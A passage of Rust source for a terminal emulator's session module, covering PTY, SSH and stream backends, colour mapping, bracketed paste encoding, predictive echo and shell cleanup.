//! Terminal sessions: a PTY, a parser, and a screen, joined.
//!
//! This is the piece that makes the engine real. Before it, `core-term` had only
//! ever parsed synthetic corpora.
//!
//! ## Threading (CLAUDE.md §13)
//!
//! One OS thread per session reads the PTY and feeds the parser. §13.2 argues for
//! a dedicated thread rather than a tokio task for the focused terminal — "task
//! wake-up costs microseconds and the scheduler can delay you unpredictably" —
//! and with no tokio runtime in the app yet, a plain thread is also the simplest
//! thing that is correct.
//!
//! ## Why the UI polls instead of being pushed
//!
//! §13.1 rule 8: "Progress via `AtomicU64` sampled by the UI at 10 Hz. Never one
//! message per chunk — at 100 MB/s with 256 KB chunks that is 400 msg/s and it
//! will melt the frame budget." The same reasoning applies with more force to PTY
//! output, which can arrive in thousands of small writes per frame.
//!
//! So the reader thread never emits an event. It bumps a generation counter, and
//! the UI asks for changed rows once per frame. 10,000 writes in one frame cost
//! exactly one snapshot — which is §5.4's coalescing rule, enforced at the IPC
//! boundary.

use std::collections::HashMap;
use std::io::{Read, Write};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, OnceLock};

use opspilot_core_term::predict::{Config as PredictConfig, Context as PredictContext, Overlay};
use opspilot_core_term::style::{color, Style, StyleId};
use opspilot_core_term::{Parser, Predictor, Screen};

use crate::shells::ShellInfo;
use portable_pty::{CommandBuilder, NativePtySystem, PtySize, PtySystem};
use serde::Serialize;

/// Read buffer. Large enough that a flood costs few syscalls, small enough to
/// stay well inside L2 alongside the grid.
const READ_BUF: usize = 64 * 1024;

pub type SessionId = u32;

/* ---- Wire types ---------------------------------------------------------- */

/// One run of cells sharing a style, within a row.
///
/// Rows are sent as text plus spans rather than cell-by-cell: a typical line is
/// one or two spans, so this is far smaller than a per-cell array and it maps
/// directly onto a canvas `fillText` call.
#[derive(Serialize, Clone, Debug)]
pub struct Span {
    pub start: usize,
    pub len: usize,
    /// CSS colour string, resolved here so the webview never learns the palette.
    pub fg: String,
    pub bg: String,
    pub bold: bool,
    pub italic: bool,
    pub underline: bool,
    pub reverse: bool,
}

#[derive(Serialize, Clone, Debug)]
pub struct LineUpdate {
    pub row: usize,
    pub text: String,
    pub spans: Vec<Span>,
}

#[derive(Serialize, Clone, Debug)]
pub struct Snapshot {
    pub generation: u64,
    pub rows: usize,
    pub cols: usize,
    pub cursor_row: usize,
    pub cursor_col: usize,
    pub title: String,
    pub alive: bool,
    /// Only rows that changed since the previous snapshot.
    pub lines: Vec<LineUpdate>,
    /// True when the caller must discard what it has and repaint everything
    /// (first snapshot, a resize, or a scroll).
    pub full: bool,
    /// Lines scrolled back from the live viewport. 0 = at the bottom.
    pub scroll_offset: usize,
    /// How far back it is possible to scroll.
    pub scroll_max: usize,
    /// DECCKM: the keyboard encoder must send `ESC O A` for Up, not `ESC [ A`.
    pub app_cursor: bool,
    /// DECTCEM. Full-screen programs hide the cursor while they draw; a block
    /// left behind on whatever cell they last touched is visual noise.
    pub cursor_visible: bool,
}

/* ---- Colour resolution --------------------------------------------------- */

/// The xterm 16-colour base, chosen to sit inside the OpsPilot chassis palette
/// rather than fighting it. Bright variants are the same hues lifted, not the
/// usual saturated primaries, which glare against `--chassis-900`.
const ANSI: [&str; 16] = [
    "#1B1F26", "#E5484D", "#4FD1C5", "#F2A93B", "#6B8AFD", "#A78BFA", "#4FD1C5", "#9AA6B8",
    "#3A4252", "#FF6369", "#6EE7DB", "#FFC46B", "#8FA6FF", "#C4B5FD", "#7FE3DA", "#E8ECF2",
];

const DEFAULT_FG_CSS: &str = "#E8ECF2"; // --text-hi
const DEFAULT_BG_CSS: &str = "#14171C"; // --chassis-900

fn css_color(c: u32, is_bg: bool) -> String {
    if c & color::TAG_DEFAULT != 0 {
        return if is_bg {
            DEFAULT_BG_CSS
        } else {
            DEFAULT_FG_CSS
        }
        .to_string();
    }
    if c & color::TAG_INDEXED != 0 {
        let i = (c & 0xFF) as usize;
        if i < 16 {
            return ANSI[i].to_string();
        }
        // 256-colour cube and greyscale ramp.
        if (16..232).contains(&i) {
            let j = i - 16;
            let f = |v: usize| -> u8 {
                if v == 0 {
                    0
                } else {
                    (55 + v * 40) as u8
                }
            };
            return format!("#{:02x}{:02x}{:02x}", f(j / 36), f((j / 6) % 6), f(j % 6));
        }
        let v = (8 + (i - 232) * 10) as u8;
        return format!("#{v:02x}{v:02x}{v:02x}");
    }
    format!("#{:06x}", c & 0xFF_FFFF)
}

/* ---- Session ------------------------------------------------------------- */

struct Inner {
    screen: Screen,
    parser: Parser,
    /// Rows changed since the last snapshot. Kept separately from the grid's own
    /// damage bitset because the grid's is the *renderer's* to clear, and here
    /// there are two consumers with different clocks.
    dirty: Vec<bool>,
    full_repaint: bool,
    /// Lines above the live viewport currently being viewed. 0 = live.
    scroll_offset: usize,
    /// Predictive local echo (§5.5). Enabled only for remote sessions: on a
    /// local PTY the echo is already back before the next frame, so every
    /// prediction is a risk taken for no gain.
    predictor: Predictor,
}

/// Milliseconds since the process started.
///
/// `core-term`'s predictor takes a monotonic tick rather than reading a clock
/// itself, which is what makes every timeout in its tests deterministic. This is
/// the app supplying one.
fn now_ms() -> u64 {
    static START: OnceLock<std::time::Instant> = OnceLock::new();
    START.get_or_init(std::time::Instant::now).elapsed().as_millis() as u64
}

/// Reconcile predictions against what the server actually sent (§5.5 steps 2–4).
///
/// Called from the reader, immediately after the bytes are in the grid. Any row
/// that *held* a prediction is marked dirty whether or not the grid changed
/// there: confirming or discarding one changes what is drawn, and a snapshot
/// driven only by grid damage would leave a stale predicted character on screen
/// with nothing to force a repaint.
fn reconcile(screen: &Screen, predictor: &mut Predictor, dirty: &mut [bool]) {
    if predictor.outstanding() == 0 {
        return;
    }
    // Bounded by MAX_OUTSTANDING (12), so this allocation is small and only
    // happens while predictions are in flight.
    let touched: Vec<usize> = predictor.overlay().map(|o| o.row).collect();
    predictor.reconcile(screen, now_ms());
    for r in touched {
        if let Some(slot) = dirty.get_mut(r) {
            *slot = true;
        }
    }
}

/// Does this write carry a bracketed paste?
///
/// §5.5 forbids predicting during one: the paste is not echoed character by
/// character, so every prediction in it would miss. [`Session::paste`] never
/// reaches the predictor at all; this catches a paste that arrives as keystroke
/// bytes anyway (broadcast, or a future caller), where it would be easy to forget.
fn is_paste(bytes: &[u8]) -> bool {
    bytes.windows(6).any(|w| w == PASTE_START)
}

const PASTE_START: &[u8] = b"\x1b[200~";
const PASTE_END: &[u8] = b"\x1b[201~";

/// Clipboard text -> the bytes a terminal sends for a paste.
///
/// Two rules, both from xterm and followed by every terminal since:
///
/// 1. **Line endings become `CR`.** That is what the Enter key sends. A bare
///    `LF` would reach a raw-mode program as Ctrl+J, and `CRLF` from a Windows
///    clipboard would press Enter twice per line.
/// 2. **With `?2004` set, wrap in `ESC[200~ … ESC[201~`** — and remove any
///    `ESC[201~` already inside the text. Without that, clipboard content can
///    close the bracket early and everything after it is *typed*, so a pasted
///    line ending in a newline executes. That is a real attack on people who
///    paste commands from web pages, and the bracket exists to stop it.
///
/// Without bracketed paste the text is sent as typed, newlines included. The
/// shells that ship with every current distro (bash ≥ 5.1, zsh, fish) enable
/// the mode, so this branch is old servers and raw programs.
pub fn paste_bytes(text: &str, bracketed: bool) -> Vec<u8> {
    let mut out = Vec::with_capacity(text.len() + 12);
    if bracketed {
        out.extend_from_slice(PASTE_START);
    }
    let bytes = text.as_bytes();
    let mut i = 0;
    // O(n) in the pasted text: one pass, each byte copied at most once.
    while i < bytes.len() {
        let b = bytes[i];
        if b == b'\r' {
            out.push(b'\r');
            i += if bytes.get(i + 1) == Some(&b'\n') { 2 } else { 1 };
        } else if b == b'\n' {
            out.push(b'\r');
            i += 1;
        } else if bracketed && bytes[i..].starts_with(PASTE_END) {
            i += PASTE_END.len();
        } else {
            out.push(b);
            i += 1;
        }
    }
    if bracketed {
        out.extend_from_slice(PASTE_END);
    }
    out
}

/// Where a session's bytes come from.
///
/// A terminal does not care whether the other end is a local shell or a shell on
/// a server three continents away — same parser, same grid, same snapshot
/// protocol. Only the plumbing differs, so only the plumbing is behind this.
enum Backend {
    Pty {
        /// Keystrokes go to a writer thread through a bounded channel. A
        /// direct `write_all` blocked the caller — the UI thread — whenever the
        /// program stopped reading stdin and the ~4 KiB PTY input queue filled.
        input: Mutex<Option<std::sync::mpsc::SyncSender<Vec<u8>>>>,
        master: Mutex<Box<dyn portable_pty::MasterPty + Send>>,
        /// Tells the reader thread to stop. It polls with a timeout instead of
        /// blocking in `read`, because a background job that still holds the
        /// PTY slave (`cmd & disown`) keeps `read` from ever returning — and
        /// the reader's own dup of the master keeps the kernel from hanging
        /// the PTY up. Both leaked, per closed tab.
        closing: Arc<AtomicBool>,
    },
    Ssh {
        shell: opspilot_core_ssh::Shell,
        /// Held so the pooled transport outlives the channel.
        _transport: Arc<opspilot_core_ssh::Transport>,
    },
    /// Anything else that produces terminal bytes: a shell exec'd into a
    /// container or a pod, or a followed log. See [`StreamIo`].
    Stream {
        /// `None` for a read-only stream (logs): keystrokes are dropped.
        input: Mutex<Option<tokio::sync::mpsc::Sender<Vec<u8>>>>,
        resize: Mutex<Option<tokio::sync::mpsc::Sender<(u16, u16)>>>,
        /// Dropped by `kill` to stop the reader, which drops the output
        /// receiver, which is how the producer learns to stop.
        stop: Mutex<Option<tokio::sync::oneshot::Sender<()>>>,
    },
}

/// The plain-channel contract between a session and whatever feeds it.
///
/// Docker exec, Kubernetes exec and log follows all render in the ordinary
/// terminal — §10: "Log streaming reuses the terminal ring buffer and coalescing
/// rules verbatim". Deliberately only tokio channels, so the producer crates
/// share no types with this one:
///
/// - the producer sends output chunks on `output`, and stops when a send fails
///   (the session closed) or its source ends;
/// - keystrokes and resizes arrive on the receivers it was handed; both close
///   when the session does.
///
/// Every channel is bounded (§13.1 rule 7).
pub struct StreamIo {
    pub output: tokio::sync::mpsc::Receiver<Vec<u8>>,
    pub input: Option<tokio::sync::mpsc::Sender<Vec<u8>>>,
    pub resize: Option<tokio::sync::mpsc::Sender<(u16, u16)>>,
    /// Output from a process with no TTY (a container's logs) uses bare `LF`.
    /// A terminal needs `CR LF`, or every line starts where the last one ended
    /// — the "staircase". A PTY's `onlcr` normally does this; there is no PTY.
    pub lf_to_crlf: bool,
}

/// Channel depth for stream sessions. Output chunks are typically 4–32 KiB, so
/// 64 in flight is ample before the producer waits on the parser.
pub const STREAM_DEPTH: usize = 64;

/// Bare `LF` -> `CR LF`. `prev` is the last byte of the previous chunk, so a
/// `CR LF` split across two chunks is not doubled. O(n).
fn lf_to_crlf(chunk: &[u8], prev: &mut u8) -> Vec<u8> {
    let mut out = Vec::with_capacity(chunk.len() + chunk.len() / 32);
    for &b in chunk {
        if b == b'\n' && *prev != b'\r' {
            out.push(b'\r');
        }
        out.push(b);
        *prev = b;
    }
    out
}

/// Parse one chunk of output into the screen and mark what it damaged.
fn ingest(inner: &Mutex<Inner>, chunk: &[u8]) {
    if let Ok(mut g) = inner.lock() {
        let Inner {
            screen,
            parser,
            dirty,
            predictor,
            ..
        } = &mut *g;
        parser.advance(screen, chunk);
        for r in screen.grid().dirty_rows() {
            if let Some(slot) = dirty.get_mut(r) {
                *slot = true;
            }
        }
        screen.grid_mut().clear_damage();
        reconcile(screen, predictor, dirty);
    }
}

pub struct Session {
    inner: Arc<Mutex<Inner>>,
    backend: Backend,
    /// Kept so closing a session can kill the shell rather than hoping it
    /// notices the PTY went away. A `cmd.exe` blocked on input does not always
    /// exit when its console closes, and a leaked shell per closed tab is the
    /// kind of thing nobody sees until Task Manager has thirty of them.
    child: Arc<Mutex<Option<Box<dyn portable_pty::Child + Send + Sync>>>>,
    generation: Arc<AtomicU64>,
    alive: Arc<AtomicBool>,
    /// Real traffic counters, for the status rail. §13.1 rule 8: atomics the UI
    /// samples, never a message per chunk.
    bytes_in: Arc<AtomicU64>,
    bytes_out: Arc<AtomicU64>,
    /// True for an SSH session; the rail distinguishes local from remote.
    remote: bool,
    /// Set when the PTY reader thread has exited. Diagnostics, and the test
    /// that closing a session really ends it.
    reader_exited: Arc<AtomicBool>,
    /// Set while scrollback still needs re-wrapping after a resize (§5.6).
    ///
    /// An atomic rather than a look inside the screen, so the snapshot fast path
    /// stays "one atomic load and nothing else" on an idle terminal. Reflow is
    /// driven from there — one 1,000-row chunk per polled frame, which is the
    /// "background task" §5.6 asks for without a thread to own it.
    reflowing: Arc<AtomicBool>,
}

impl Drop for Session {
    fn drop(&mut self) {
        self.kill();
    }
}

impl Session {
    pub fn spawn(rows: u16, cols: u16, shell: ShellInfo) -> Result<Session, String> {
        let pty = NativePtySystem::default();
        let pair = pty
            .openpty(PtySize {
                rows,
                cols,
                pixel_width: 0,
                pixel_height: 0,
            })
            .map_err(|e| format!("openpty failed: {e}"))?;

        let mut cmd = CommandBuilder::new(&shell.program);
        for a in &shell.args {
            cmd.arg(a);
        }
        // Say what this terminal is. On Linux and macOS the child inherits the
        // *launching* environment: started from a desktop launcher there is no
        // TERM at all (shells fall back to "dumb": no colour, `clear` fails,
        // vim complains), and started from another terminal it inherits that
        // terminal's identity — `xterm-kitty`, say — and emits sequences for a
        // terminal this is not. The parser speaks xterm plus `SGR 38;2` truecolour.
        cmd.env("TERM", "xterm-256color");
        cmd.env("COLORTERM", "truecolor");
        cmd.env("TERM_PROGRAM", "OpsPilot");
        cmd.env("TERM_PROGRAM_VERSION", env!("CARGO_PKG_VERSION"));
        // Markers that make tools believe they are inside *another* emulator
        // and switch to its private protocols (kitty graphics, VTE prompts).
        for k in [
            "KITTY_WINDOW_ID",
            "KITTY_PID",
            "WEZTERM_PANE",
            "WEZTERM_EXECUTABLE",
            "ALACRITTY_WINDOW_ID",
            "ALACRITTY_SOCKET",
            "VTE_VERSION",
            "KONSOLE_VERSION",
            "GNOME_TERMINAL_SCREEN",
            "TERMINAL_EMULATOR",
        ] {
            cmd.env_remove(k);
        }
        // Per-shell env last, so a shell that genuinely needs a different TERM
        // can still say so.
        for (k, v) in &shell.env {
            cmd.env(k, v);
        }
        // Start where the user is, not where the app happens to live. Git Bash
        // also needs CHERE_INVOKING (set in shells.rs) for this to stick.
        if let Some(home) = home_dir() {
            cmd.cwd(home);
        }
        let mut child = pair
            .slave
            .spawn_command(cmd)
            .map_err(|e| format!("spawn failed: {e}"))?;
        // The slave handle must be dropped or the PTY never reports EOF when the
        // child exits, and the reader thread hangs forever on a dead session.
        drop(pair.slave);

        // From here an error must not leave the shell running unreaped: no
        // Session exists yet, so its Drop would not do it.
        let fail = |child: &mut Box<dyn portable_pty::Child + Send + Sync>, msg: String| {
            let _ = child.kill();
            let _ = child.wait();
            msg
        };
        let mut reader = match pair.master.try_clone_reader() {
            Ok(r) => r,
            Err(e) => return Err(fail(&mut child, format!("clone reader failed: {e}"))),
        };
        let mut writer = match pair.master.take_writer() {
            Ok(w) => w,
            Err(e) => return Err(fail(&mut child, format!("take writer failed: {e}"))),
        };
        // The reader polls its own dup of the master (closed when it exits),
        // never the master's fd itself, which may be closed and reused by the
        // time a poll runs.
        #[cfg(unix)]
        let poll_fd = match pair.master.as_raw_fd().map(|fd| unsafe { libc::dup(fd) }) {
            Some(fd) if fd >= 0 => fd,
            _ => return Err(fail(&mut child, "dup of the PTY master failed".into())),
        };

        // Bounded: 256 messages of typically a few bytes each. A paste is one
        // message. A full queue means the program stopped reading input, and
        // the keystroke is refused with an error rather than blocking.
        let (in_tx, in_rx) = std::sync::mpsc::sync_channel::<Vec<u8>>(256);
        if let Err(e) = std::thread::Builder::new()
            .name("opspilot-pty-w".into())
            .spawn(move || {
                // Ends when the sender is dropped (session closed) or the PTY
                // write fails (session ended).
                for chunk in in_rx {
                    if writer.write_all(&chunk).and_then(|_| writer.flush()).is_err() {
                        break;
                    }
                }
            })
        {
            #[cfg(unix)]
            unsafe {
                libc::close(poll_fd);
            }
            return Err(fail(&mut child, format!("thread spawn failed: {e}")));
        }
        let child = Arc::new(Mutex::new(Some(child)));
        let closing = Arc::new(AtomicBool::new(false));
        let reader_exited = Arc::new(AtomicBool::new(false));

        let inner = Arc::new(Mutex::new(Inner {
            screen: Screen::new(rows as usize, cols as usize),
            parser: Parser::new(),
            dirty: vec![true; rows as usize],
            full_repaint: true,
            scroll_offset: 0,
            // A local PTY echoes in microseconds. Prediction there is a guess
            // taken against no latency at all, so it is off (§5.5's own
            // reasoning, and §1.6 of the pending list).
            predictor: Predictor::new(PredictConfig {
                enabled: false,
                underline_unconfirmed: false,
            }),
        }));
        let generation = Arc::new(AtomicU64::new(1));
        let alive = Arc::new(AtomicBool::new(true));
        let bytes_in = Arc::new(AtomicU64::new(0));
        let bytes_out = Arc::new(AtomicU64::new(0));

        {
            let inner = Arc::clone(&inner);
            let generation = Arc::clone(&generation);
            let alive = Arc::clone(&alive);
            let reaper = Arc::clone(&child);
            let bytes_in = Arc::clone(&bytes_in);
            let closing = Arc::clone(&closing);
            let exited = Arc::clone(&reader_exited);
            let spawned = std::thread::Builder::new()
                .name("opspilot-pty".into())
                .spawn(move || {
                    let mut buf = vec![0u8; READ_BUF];
                    loop {
                        if closing.load(Ordering::Acquire) {
                            break;
                        }
                        // Wait for data with a timeout, so a close is noticed
                        // even if the PTY never becomes readable again.
                        #[cfg(unix)]
                        {
                            let mut pfd = libc::pollfd {
                                fd: poll_fd,
                                events: libc::POLLIN,
                                revents: 0,
                            };
                            let r = unsafe { libc::poll(&mut pfd, 1, 250) };
                            if r == 0 {
                                continue; // timeout: re-check `closing`
                            }
                            if r < 0 {
                                if std::io::Error::last_os_error().kind() == std::io::ErrorKind::Interrupted {
                                    continue;
                                }
                                break;
                            }
                        }
                        match reader.read(&mut buf) {
                            // A signal landing mid-read (SIGCHLD, SIGWINCH on
                            // resize) is not the session ending. Treating it as
                            // one kills a live Unix terminal at random.
                            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
                            // Linux reports a closed PTY as EIO, not EOF.
                            Ok(0) | Err(_) => break,
                            Ok(n) => {
                                if let Ok(mut g) = inner.lock() {
                                    let Inner {
                                        screen,
                                        parser,
                                        dirty,
                                        predictor,
                                        ..
                                    } = &mut *g;
                                    parser.advance(screen, &buf[..n]);
                                    for r in screen.grid().dirty_rows() {
                                        if let Some(slot) = dirty.get_mut(r) {
                                            *slot = true;
                                        }
                                    }
                                    screen.grid_mut().clear_damage();
                                    reconcile(screen, predictor, dirty);
                                }
                                bytes_in.fetch_add(n as u64, Ordering::Relaxed);
                                // One counter bump, however many bytes arrived.
                                // The UI samples this; it is never pushed.
                                generation.fetch_add(1, Ordering::Release);
                            }
                        }
                    }
                    #[cfg(unix)]
                    unsafe {
                        libc::close(poll_fd);
                    }
                    // Reap the shell if it has exited — without holding the
                    // lock across a blocking wait (that stalled `kill` on the
                    // UI thread whenever the shell outlived its output), and
                    // taking it out once reaped so `kill` never signals a PID
                    // that may since have been reused by another process.
                    for _ in 0..20 {
                        let exited = match reaper.lock() {
                            Ok(mut c) => match c.as_mut().map(|c| c.try_wait()) {
                                Some(Ok(Some(_))) => {
                                    c.take();
                                    true
                                }
                                None => true, // already taken by kill
                                _ => false,
                            },
                            Err(_) => true,
                        };
                        if exited {
                            break;
                        }
                        std::thread::sleep(std::time::Duration::from_millis(50));
                    }
                    alive.store(false, Ordering::Release);
                    generation.fetch_add(1, Ordering::Release);
                    exited.store(true, Ordering::Release);
                });
            if let Err(e) = spawned {
                if let Ok(mut c) = child.lock() {
                    if let Some(c) = c.as_mut() {
                        let _ = c.kill();
                        let _ = c.wait();
                    }
                }
                return Err(format!("thread spawn failed: {e}"));
            }
        }

        Ok(Session {
            inner,
            backend: Backend::Pty {
                input: Mutex::new(Some(in_tx)),
                master: Mutex::new(pair.master),
                closing,
            },
            child,
            generation,
            alive,
            bytes_in,
            bytes_out,
            remote: false,
            reflowing: Arc::new(AtomicBool::new(false)),
            reader_exited,
        })
    }

    /// Open a shell on an already-connected SSH transport.
    ///
    /// The transport comes from the pool (`crate::remote`), so this is a channel
    /// open, not a handshake — §8.1's "new tab costs 20 ms" claim depends on
    /// exactly this being true.
    pub fn spawn_ssh(
        rows: u16,
        cols: u16,
        transport: Arc<opspilot_core_ssh::Transport>,
    ) -> Result<Session, String> {
        let rt = crate::remote::runtime();
        let mut shell = rt
            .block_on(transport.open_shell(rows, cols))
            .map_err(|e| e.to_string())?;
        let mut output = shell
            .take_output()
            .ok_or_else(|| "shell output already taken".to_string())?;

        let inner = Arc::new(Mutex::new(Inner {
            screen: Screen::new(rows as usize, cols as usize),
            parser: Parser::new(),
            dirty: vec![true; rows as usize],
            full_repaint: true,
            scroll_offset: 0,
            // §5.5's 20–40x is a *remote* number: it is the round trip that
            // prediction hides. The gate inside the predictor decides the rest.
            predictor: Predictor::new(PredictConfig {
                enabled: true,
                underline_unconfirmed: false,
            }),
        }));
        let generation = Arc::new(AtomicU64::new(1));
        let alive = Arc::new(AtomicBool::new(true));
        let bytes_in = Arc::new(AtomicU64::new(0));
        let bytes_out = Arc::new(AtomicU64::new(0));

        {
            let inner = Arc::clone(&inner);
            let generation = Arc::clone(&generation);
            let alive = Arc::clone(&alive);
            let bytes_in = Arc::clone(&bytes_in);
            // On the network runtime, not a blocking thread: the bytes arrive
            // as channel messages, so there is nothing to block on.
            rt.spawn(async move {
                while let Some(chunk) = output.recv().await {
                    bytes_in.fetch_add(chunk.len() as u64, Ordering::Relaxed);
                    ingest(&inner, &chunk);
                    generation.fetch_add(1, Ordering::Release);
                }
                alive.store(false, Ordering::Release);
                generation.fetch_add(1, Ordering::Release);
            });
        }

        Ok(Session {
            inner,
            backend: Backend::Ssh {
                shell,
                _transport: transport,
            },
            child: Arc::new(Mutex::new(None)),
            generation,
            alive,
            bytes_in,
            bytes_out,
            remote: true,
            reflowing: Arc::new(AtomicBool::new(false)),
            reader_exited: Arc::new(AtomicBool::new(false)),
        })
    }

    /// A terminal fed by a [`StreamIo`] rather than a PTY or an SSH channel.
    pub fn spawn_stream(rows: u16, cols: u16, io: StreamIo, remote: bool) -> Session {
        let rt = crate::remote::runtime();
        let inner = Arc::new(Mutex::new(Inner {
            screen: Screen::new(rows as usize, cols as usize),
            parser: Parser::new(),
            dirty: vec![true; rows as usize],
            full_repaint: true,
            scroll_offset: 0,
            // Off: §5.5's gate is built around a shell echoing keystrokes, and a
            // log follow echoes nothing. Exec'd shells could predict, but the
            // hit rate has never been measured through an exec stream.
            predictor: Predictor::new(PredictConfig {
                enabled: false,
                underline_unconfirmed: false,
            }),
        }));
        let generation = Arc::new(AtomicU64::new(1));
        let alive = Arc::new(AtomicBool::new(true));
        let bytes_in = Arc::new(AtomicU64::new(0));
        let (stop_tx, mut stop_rx) = tokio::sync::oneshot::channel::<()>();

        {
            let inner = Arc::clone(&inner);
            let generation = Arc::clone(&generation);
            let alive = Arc::clone(&alive);
            let bytes_in = Arc::clone(&bytes_in);
            let StreamIo {
                mut output,
                lf_to_crlf: translate,
                ..
            } = io;
            rt.spawn(async move {
                let mut prev = 0u8;
                loop {
                    let chunk = tokio::select! {
                        c = output.recv() => match c { Some(c) => c, None => break },
                        // Sender dropped by `kill` (or the session itself).
                        _ = &mut stop_rx => break,
                    };
                    bytes_in.fetch_add(chunk.len() as u64, Ordering::Relaxed);
                    if translate {
                        ingest(&inner, &lf_to_crlf(&chunk, &mut prev));
                    } else {
                        ingest(&inner, &chunk);
                    }
                    generation.fetch_add(1, Ordering::Release);
                }
                alive.store(false, Ordering::Release);
                generation.fetch_add(1, Ordering::Release);
                // `output` drops here: the producer's next send fails and it stops.
            });
        }

        Session {
            inner,
            backend: Backend::Stream {
                input: Mutex::new(io.input),
                resize: Mutex::new(io.resize),
                stop: Mutex::new(Some(stop_tx)),
            },
            child: Arc::new(Mutex::new(None)),
            generation,
            alive,
            bytes_in,
            bytes_out: Arc::new(AtomicU64::new(0)),
            remote,
            reflowing: Arc::new(AtomicBool::new(false)),
            reader_exited: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Offer keystroke bytes to the predictor and mark what it painted.
    ///
    /// Takes the guard the caller already holds: the prediction and the write
    /// must not be separated by a window in which the server's echo could land.
    fn predict(&self, g: &mut Inner, bytes: &[u8]) -> usize {
        let Inner {
            screen,
            parser,
            dirty,
            predictor,
            ..
        } = g;
        let ctx = PredictContext {
            in_string: parser.in_string(),
            bracketed_paste: is_paste(bytes),
        };
        let made = predictor.on_input(screen, &ctx, bytes, now_ms());
        if made > 0 {
            for o in predictor.overlay() {
                if let Some(slot) = dirty.get_mut(o.row) {
                    *slot = true;
                }
            }
            // §5.4's split render paths: the input path repaints on the input
            // event rather than waiting for output. The counter moves now so the
            // very next polled frame carries the prediction.
            self.generation.fetch_add(1, Ordering::Release);
        }
        made
    }

    /// Prediction telemetry, or `None` where prediction is not running.
    fn prediction_stat(&self) -> Option<PredictionStat> {
        if !self.remote {
            return None;
        }
        let g = self.inner.lock().ok()?;
        let s = g.predictor.stats();
        Some(PredictionStat {
            hit_rate: s.hit_rate(),
            samples: s.samples(),
            confirmed: s.confirmed,
            missed: s.missed,
            timed_out: s.timed_out,
            flushes: s.flushes,
            outstanding: g.predictor.outstanding(),
            disabled: s.disabled_for_session,
            echo_off: g.predictor.echo_appears_disabled(),
        })
    }

    /// (bytes received, bytes sent, is remote) — sampled by the status rail.
    pub fn traffic(&self) -> (u64, u64, bool) {
        (
            self.bytes_in.load(Ordering::Relaxed),
            self.bytes_out.load(Ordering::Relaxed),
            self.remote,
        )
    }

    /// Terminate the shell. Idempotent.
    pub fn kill(&self) {
        match &self.backend {
            Backend::Ssh { shell, .. } => shell.close(),
            Backend::Stream {
                input,
                resize,
                stop,
            } => {
                // Dropping the senders closes the producer's receivers; dropping
                // `stop` ends the reader, which drops the output receiver.
                if let Ok(mut g) = input.lock() {
                    g.take();
                }
                if let Ok(mut g) = resize.lock() {
                    g.take();
                }
                if let Ok(mut g) = stop.lock() {
                    g.take();
                }
            }
            Backend::Pty {
                input,
                master,
                closing,
            } => {
                closing.store(true, Ordering::Release);
                if let Ok(mut g) = input.lock() {
                    g.take(); // ends the writer thread
                }
                // SIGHUP the foreground process group, as a terminal closing
                // does — not just the shell, or `vim` started from it lives on.
                #[cfg(unix)]
                if let Some(pgid) = master.lock().ok().and_then(|m| m.process_group_leader()) {
                    if pgid > 1 {
                        unsafe {
                            libc::kill(-pgid, libc::SIGHUP);
                        }
                    }
                }
                #[cfg(not(unix))]
                let _ = master;
            }
        }
        // Take the child first, then signal it only if it is still running:
        // if the reader already reaped it, its PID may belong to someone else.
        let child = self.child.lock().ok().and_then(|mut c| c.take());
        if let Some(mut c) = child {
            if matches!(c.try_wait(), Ok(None)) {
                let _ = c.kill();
                let _ = c.wait();
            }
        }
        self.alive.store(false, Ordering::Release);
    }

    /// Bytes from the keyboard, straight to the PTY. Never filtered — the shell
    /// decides what a keystroke means.
    ///
    /// Predictive echo (§5.5) happens here, and it is deliberately *before* the
    /// write: the point is that the character is on screen before the bytes have
    /// left the machine, let alone come back. Prediction never changes what is
    /// transmitted — the same bytes go out either way.
    pub fn write(&self, bytes: &[u8]) -> Result<(), String> {
        // Typing snaps back to the live view. Every terminal does this, and the
        // alternative — typing into a screen you cannot see — is worse.
        if let Ok(mut g) = self.inner.lock() {
            if g.scroll_offset != 0 {
                g.scroll_offset = 0;
                g.full_repaint = true;
                self.generation.fetch_add(1, Ordering::Release);
            }

            self.predict(&mut g, bytes);
        }
        self.send(bytes)
    }

    /// Paste text, encoded for whatever the application currently expects.
    ///
    /// Separate from [`write`](Self::write) for two reasons: the bracketed-paste
    /// decision must use the mode as it is *now*, which only this side knows;
    /// and a paste must never reach the predictor (§5.5).
    pub fn paste(&self, text: &str) -> Result<(), String> {
        let bracketed = {
            let mut g = self.inner.lock().map_err(|_| "screen poisoned")?;
            if g.scroll_offset != 0 {
                g.scroll_offset = 0;
                g.full_repaint = true;
                self.generation.fetch_add(1, Ordering::Release);
            }
            g.screen.modes().bracketed_paste
        };
        self.send(&paste_bytes(text, bracketed))
    }

    fn send(&self, bytes: &[u8]) -> Result<(), String> {
        self.bytes_out
            .fetch_add(bytes.len() as u64, Ordering::Relaxed);
        match &self.backend {
            Backend::Pty { input, .. } => {
                let g = input.lock().map_err(|_| "input poisoned")?;
                match g.as_ref() {
                    Some(tx) => tx.try_send(bytes.to_vec()).map_err(|e| match e {
                        std::sync::mpsc::TrySendError::Full(_) => {
                            "input not accepted: the program is not reading its input".to_string()
                        }
                        std::sync::mpsc::TrySendError::Disconnected(_) => "session ended".to_string(),
                    }),
                    None => Err("session closed".into()),
                }
            }
            Backend::Ssh { shell, .. } => shell.write(bytes.to_vec()).map_err(|e| e.to_string()),
            Backend::Stream { input, .. } => {
                let g = input.lock().map_err(|_| "input poisoned")?;
                match g.as_ref() {
                    // try_send, never blocking: this runs on the IPC thread, and
                    // a stalled container must not freeze the window.
                    Some(tx) => tx
                        .try_send(bytes.to_vec())
                        .map_err(|e| format!("input not accepted: {e}")),
                    // Read-only (a log follow): keystrokes go nowhere.
                    None => Ok(()),
                }
            }
        }
    }

    pub fn resize(&self, rows: u16, cols: u16) -> Result<(), String> {
        match &self.backend {
            Backend::Pty { master, .. } => master
                .lock()
                .map_err(|_| "master poisoned")?
                .resize(PtySize {
                    rows,
                    cols,
                    pixel_width: 0,
                    pixel_height: 0,
                })
                .map_err(|e| e.to_string())?,
            // SSH sends SSH_MSG_CHANNEL_WINDOW_CHANGE; the remote pty resizes
            // and the shell gets SIGWINCH, same as locally.
            Backend::Ssh { shell, .. } => shell.resize(rows, cols).map_err(|e| e.to_string())?,
            Backend::Stream { resize, .. } => {
                if let Some(tx) = resize.lock().map_err(|_| "resize poisoned")?.as_ref() {
                    // A dropped resize is harmless: the next one supersedes it.
                    let _ = tx.try_send((rows, cols));
                }
            }
        }
